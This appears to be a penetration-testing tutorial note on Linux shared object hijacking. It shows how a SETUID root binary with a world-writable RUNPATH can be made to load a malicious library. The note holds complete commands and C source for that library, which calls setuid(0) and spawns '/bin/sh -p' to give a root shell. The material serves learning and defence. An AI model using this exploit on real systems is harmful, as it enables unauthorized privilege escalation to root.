
# Shared Object Hijacking

## Concept

A privileged binary (SETUID root) loads a shared library (`.so`) from a writable location.

If attacker can:

- modify library
    
- replace library
    
- control RUNPATH
    

then attacker can execute malicious code as root.

---

# Key Concepts

## Shared Object (`.so`)

Dynamic library loaded during runtime.

Example:

```text
libshared.so
```

---

## SETUID Binary

```bash
ls -la payroll
```

Output:

```text
-rwsr-xr-x
```

Meaning:

- binary runs with owner's privileges
    
- owner = root
    
- execution gives root privileges
    

---

# Step 1 — Check Libraries Used By Binary

### Execute on Victim Machine

```bash
ldd payroll
```

Output:

```text
libshared.so => /development/libshared.so
```

Meaning:

- payroll depends on `libshared.so`
    
- library loaded from `/development`
    

---

# What `ldd` Does

`ldd` shows:

- all shared libraries required by binary
    
- exact path of each library
    

---

# Step 2 — Check RUNPATH

### Execute on Victim Machine

```bash
readelf -d payroll | grep PATH
```

Output:

```text
RUNPATH: [/development]
```

Meaning:

- binary searches `/development`
    
- before normal system paths
    

---

# Why This Is Dangerous

If `/development` is writable:

```bash
ls -la /development
```

Output:

```text
drwxrwxrwx
```

Meaning:

- everyone can write there
    
- attacker can replace library
    


---

# Step 3 — Discover Required Function

### Execute on Victim Machine

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

Purpose:

- place fake library
    
- trigger missing symbol error
    

---

# Execute Binary

### Execute on Victim Machine

```bash
./payroll
```

Output:

```text
undefined symbol: dbquery
```

Meaning:

- payroll expects function:
    

```c
dbquery()
```

---



---

# Step 4 — Create Malicious Library

### Execute on Victim Machine

```bash
nano src.c
```

Code:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

---

# Code Explanation

## Function Name

```c
void dbquery()
```

Must match missing symbol exactly.

---

## setuid(0)

```c
setuid(0);
```

Changes effective user ID to:

- UID 0
    
- root
    

---

## system("/bin/sh -p")

```c
system("/bin/sh -p");
```

Starts privileged shell.

`-p` preserves privileges.

---

# Step 5 — Compile Shared Library

### Execute on Victim Machine

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

---

# Compilation Flags

## `-fPIC`

```text
Position Independent Code
```

Required for shared libraries.

---

## `-shared`

Creates:

- `.so` shared object
    

---

# Step 6 — Execute Vulnerable Binary

### Execute on Victim Machine

```bash
./payroll
```

Output:

```text
Malicious library loaded
```

Then:

```bash
id
```

Output:

```text
uid=0(root)
```
